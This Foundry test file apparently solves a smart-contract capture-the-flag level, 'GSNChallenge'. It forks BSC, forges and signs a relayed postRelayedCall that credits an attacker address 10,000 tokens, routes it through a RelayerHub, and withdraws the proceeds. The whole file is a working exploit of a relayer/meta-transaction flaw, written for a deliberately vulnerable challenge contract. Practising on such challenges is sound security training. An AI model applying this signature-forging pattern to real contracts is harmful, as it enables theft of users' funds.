// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/6-GSN/GSNChallenge.sol";

contract GSNChallengeTest is Test {
    address private developer = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;
    address private attacker = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf; // vm.addr(1);

    GSNChallenge challenge;

    function setUp() public {
        vm.createSelectFork("bsc");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker, attacker);
        challenge = new GSNChallenge();
        vm.deal(address(challenge), 1 ether);
    }

    function test_info() public {
        console.log('test_info');
        address relayer = 0x9cce157eD2fdD456d1E847D84564641c882088Be;
        console.logBytes(abi.encode('GasToken', 'GasToken', 1_000_000 ether, relayer));
    }

    function test_challenge() public {
        uint256 beforeBalance = attacker.balance;
        console.log('beforeBalance', beforeBalance);

        vm.startPrank(attacker);
        address payable relayerHub = payable(challenge.register());
        address relayer = address(RelayerHub(relayerHub).relayer());

        bytes memory data = abi.encodeWithSignature(
            "postRelayedCall(address,uint256,uint256,uint256)",
            attacker, 1_0000 ether, 0, 0
        );
        bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encode(attacker, relayer, data, 100_0000, 0)));
        console.log('vm.addr(1)', vm.addr(1));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, _msgHash);
        bytes memory sig = abi.encodePacked(r, s, v);
        RelayerHub(relayerHub).sendRelayTx(attacker, relayer, data, 100_0000, 0, sig);

        challenge.withdraw();

        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }


    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {
        // 32 is the length in bytes of hash,
        // enforced by the type signature above
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

}

